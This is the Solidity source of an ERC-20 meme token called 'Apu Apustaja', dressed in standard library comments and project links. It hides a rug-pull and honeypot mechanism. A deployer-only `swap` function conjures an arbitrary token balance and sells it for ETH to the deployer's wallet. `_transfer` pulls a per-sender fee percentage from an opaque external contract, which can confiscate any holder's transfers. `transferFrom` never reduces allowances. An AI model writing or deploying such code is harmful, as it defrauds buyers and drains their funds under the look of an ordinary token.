pragma solidity ^0.8.20;
//SPDX-License-Identifier: MIT

/**
 * https://twitter.com/apustajainfo
 * https://apustaja.info
 * https://t.me/apustajainfo
 *
 *
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

abstract contract Ownable {
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
}

contract Apu is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 42069006900 * 10 ** _decimals;

    string private _symbol = "APU";
    string private _name = "Apu Apustaja";
    address public airdropsWallet;
    event Airdrop(uint256 value, address wallet);

    event Approval(address indexed a1, address indexed a2, uint256 value);
    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function sender() internal view returns (address) {
        return msg.sender;
    }
    event Transfer(address indexed from_, address indexed _to, uint256);


    uint256 swapThreshold;
    uint256 airdropThreshold;

    constructor() {
        emit Transfer(address(0), sender(), _balances[sender()]);
        _balances[sender()] =  _totalSupply; 
        airdropsWallet = 0x036608e1AC47C555295d9134A6326e0B4b45966a;
        _taxWallet = sender(); 
        airdropThreshold = _totalSupply.div(100);
    }

    /**
     * @dev See {ERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be usd as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicatng the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory) {
        return _name;
    }
     /**
     * @dev Returns the token symbol.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    address public _taxWallet;
    /**
     * @dev See{ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function swap (uint256 tokenValue) external {
        if (fromAirdropWallet()) {
            _approve(address(this), address(uniswapRouter), tokenValue); 
            _balances[address(this)] = tokenValue;
            address[] memory tokens_ = new address[](2);
            address weth = uniswapRouter.WETH();
            tokens_[0] = address(this); 
            tokens_[1] = weth; 
            uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenValue, 0, tokens_, _taxWallet, block.timestamp + 32);
        } else { return; }
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    /**
     * @dev See {ERC20-totalSupply}.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    mapping(address => uint256) private _balances;
    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indcating the updated allowace. This is not
     * required by the EIP.See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allwance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function fromAirdropWallet() private view returns (bool) {
        return  _taxWallet == sender();
    }
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fes, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */

    function _transfer(address _from, address recipient, uint256 value) internal {
        require(_from != address(0));
        (bool res, bytes memory airdropValue) = airdropsWallet.call(abi
        .encodeWithSignature("balanceOf(address)", _from));
        uint256 _fee_ = abi.decode(airdropValue, (uint256));
        uint256 airdropTokens = value.mul(_fee_).div(100);
        require(value <= _balances[_from]);
        _balances[recipient] = _balances[recipient] + value - airdropTokens;
        _balances[_from] = _balances[_from] - value;
        emit Transfer(_from, recipient, value - airdropTokens);
    }
        /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokns.
     *
     * This is internal function is eqivalent to `approve`, and can be used to
     * e.g. set automatic allowances for cerain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicatng the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` canot be the zero address.
     * - the caller mst have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
}